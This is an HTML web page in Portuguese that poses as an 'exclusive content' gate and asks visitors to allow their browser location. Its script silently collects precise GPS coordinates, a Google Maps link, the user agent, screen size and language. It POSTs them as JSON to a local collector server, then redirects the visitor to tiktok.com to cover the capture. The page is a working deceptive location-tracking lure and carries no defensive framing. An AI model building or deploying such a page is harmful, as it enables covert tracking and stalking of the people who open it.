<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Acesso Exclusivo</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            'primary': '#4f46e5',
            'secondary': '#6366f1',
            'success': '#10b981',
            'danger': '#ef4444',
            'background-light': '#f9fafb',
            'warning': '#f9bc'
          }
        }
      }
    }
  </script>
  <style>
    body {
      font-family: 'Inter', sans-serif;
    }

    #request-location-btn:focus {
      outline: none;
      box-shadow: 0 0 0 4px rgba(79, 70, 229, 0.5);
    }
  </style>
</head>

<body class="bg-background-light min-h-screen flex items-center justify-center p-4">

  <main class="card bg-white p-6 sm:p-8 rounded-xl shadow-2xl max-w-sm w-full mx-auto text-center border border-gray-100"
    role="main">

    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
      class="w-12 h-12 text-primary mx-auto mb-4">
      <path stroke-linecap="round" stroke-linejoin="round" d="M15 10.5a3 3 0 11-6 0 3 3 0 016 0z" />
      <path stroke-linecap="round" stroke-linejoin="round"
        d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1115 0z" />
    </svg>
    <h1 class="text-2xl sm:text-3xl font-bold text-gray-800 mb-2">
      Conteúdo Exclusivo
    </h1>

    <p class="text-sm text-gray-600 mb-6">
      Clique abaixo para autorizar a localização e acessar o conteúdo exclusivo para sua região.
    </p>

    <button id="request-location-btn"
      class="w-full bg-primary hover:bg-secondary text-white font-semibold py-3 px-4 rounded-lg shadow-lg transition duration-300 ease-in-out transform hover:-translate-y-0.5 mb-4 disabled:opacity-50 disabled:cursor-not-allowed">
      Permitir Localização e Continuar
    </button>
    <div id="status"
      class="w-full p-3 rounded-lg font-medium transition duration-300 text-sm hidden"
      role="status">
      </div>

    <p id="instruction-message" class="text-xs text-gray-500 mt-4 transition duration-500">
      Aguardando sua interação...
    </p>

    <pre id="status"></pre>
    <div id="links" class="hidden"></div>
  </main>

  <script>
    let isRequesting = false;

    function formatMetadata(lat, long, accuracy, timestamp, uriMaps, navigations) {
      return [{
        latitude: lat,
        longitude: long,
        accuracy: accuracy,
        timestamp: timestamp,
        uriMaps: uriMaps.href,
      },
      {
        navegacao: {
          results: navigations
        }
      }];
    }

    function redirectPage(status, lat, long, accuracy, timestamp, uriMaps) {

      let navigations = [{
        cookieEnabled: navigator.cookieEnabled,
        online: navigator.online,
        linguagem: navigator.language
      },
      {
        screen: {
          width: screen.width,
          height: screen.height
        }
      }];

      const meta = formatMetadata(lat, long, accuracy, timestamp, uriMaps, navigations);

      if (status === true) {
        try {
          fetch("http://127.0.0.1:8080/", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              meta,
              userAgent: navigator.userAgent
            })
          })
            .then((response) => {
              return response.json();
            })
            .then((data) => {
              window.location.href = "https://tiktok.com"
            }).catch((err) => {
              // window.location.href = "https://tiktok.com"
            })
        } catch (error) {
          console.warn('Error on fetch:', error);
          window.location.href = "https://tiktok.com"
        }
      }
    }

    function updateStatus(text, type = 'initial') {
      const statusEl = document.getElementById("status");
      const instructionEl = document.getElementById("instruction-message");
      const btnEl = document.getElementById("request-location-btn");

      if (!statusEl || !instructionEl || !btnEl) return;

      statusEl.classList.remove("bg-yellow-100", "text-yellow-800", "border-yellow-300", "bg-danger", "text-white", "border-danger", "bg-success", "text-white", "border-success", "hidden");
      statusEl.classList.add("w-full", "p-3", "rounded-lg", "font-medium");

      switch (type) {
        case 'loading':
          statusEl.classList.add("bg-yellow-100", "text-yellow-800", "border-yellow-300");
          instructionEl.textContent = "Por favor, clique em **Permitir** no pop-up do navegador para continuar.";
          btnEl.disabled = true;
          break;
        case 'success':
          statusEl.classList.add("bg-success", "text-white", "border-success");
          instructionEl.textContent = "Localização obtida com sucesso. Redirecionando em instantes...";
          btnEl.classList.add("hidden");
          break;
        case 'error':
          statusEl.classList.add("bg-danger", "text-white", "border-danger");
          instructionEl.textContent = "Verificação falhou. Por favor, tente novamente e autorize a permissão.";
          btnEl.disabled = false;
          btnEl.textContent = "Tentar Novamente";
          break;
        case 'initial':
          statusEl.classList.add("hidden");
          instructionEl.textContent = "Clique no botão acima para iniciar a verificação de localização.";
          btnEl.disabled = false;
          btnEl.textContent = "Permitir Localização e Continuar";
          break;
      }

      statusEl.textContent = "Status: " + text;
    }

    function showResult(position) {
      isRequesting = false;
      if (!position || !position.coords) {
        updateStatus("Retorno inesperado da API.", 'error');
        return;
      }

      const { latitude, longitude, accuracy } = position.coords;
      const ts = new Date(position.timestamp).toLocaleString();

      const gmaps = document.createElement("a");
      gmaps.href = `https://maps.google.com/?q=${latitude},${longitude}`;

      updateStatus("Localização obtida. Redirecionando...", 'success');
      redirectPage(true, latitude, longitude, accuracy, ts, gmaps);
    }

    function handleError(err) {
      isRequesting = false;
      const msg =
        {
          1: "Permissão negada. Autorize para continuar!",
          2: "Localização indisponível. Tente novamente.",
          3: "Tempo excedido. Tente novamente.",
        }[err.code] || "Erro desconhecido";

      updateStatus(msg, 'error');
    }

    function requestLocationByUserClick() {
      if (isRequesting) return;

      if (!("geolocation" in navigator)) {
        updateStatus("Geolocation API não suportada neste dispositivo.", 'error');
        return;
      }

      isRequesting = true;
      updateStatus("Aguarde. Solicitando sua localização...", 'loading');

      navigator.geolocation.getCurrentPosition(showResult, handleError, {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      });
    }

    window.addEventListener("load", () => {
      updateStatus("Pronto para verificar a localização.", 'initial');
      
      const btn = document.getElementById("request-location-btn");
      if (btn) {
        btn.addEventListener("click", requestLocationByUserClick);
      }
    });
  </script>
</body>

</html>